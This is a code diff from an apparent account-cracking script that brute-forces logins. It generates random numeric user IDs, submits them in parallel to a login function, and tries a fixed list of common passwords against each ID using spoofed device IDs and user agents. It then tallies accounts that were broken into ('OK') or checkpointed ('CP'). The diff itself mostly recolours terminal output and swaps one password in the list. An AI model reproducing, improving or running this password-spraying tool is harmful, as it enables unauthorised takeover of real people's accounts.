@@ -676,9 +676,9 @@ def main():
 def __Random_Method__():
     user=[]
     clear()
-    print(f'\33[38;5;160m[\033[1;97m✅\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m99999')
+    print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mEXAMPLE \33[38;5;46m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m99999')
     linex()
-    limit=input(f'\33[38;5;160m[\033[1;97m✅\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
+    limit=input(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mSELECTION \33[38;5;46m▶ \033[1;97m')
     linex()
     year_code = '10000'
     for i in range(int(limit)):
@@ -691,17 +691,17 @@ def __Random_Method__():
         for mal in user:
             uid=year_code+mal
             jihad.submit(login1,uid)
-    line();print(f'\r\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;46m!');linex();print(f'\r\r\r\r\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;46m!\033[1;37m');main()
+    line();print(f'\r\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;46m!');linex();print(f'\r\r\r\r\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mTOTAL OK \33[38;5;46m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;46m!\033[1;37m');main()
 
 def login1(uid):
     global oks,loop,cps
     Session=requests.session()
     try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\33[38;5;37m-\x1b[38;5;46mB1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
+        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\33[38;5;37m-\x1b[38;5;46mB1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;46m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;46m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","1234567890","111222","123123"]:
+        for pw in ["123456","1234567","12345678","123456789","1234567890","786786","123123"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
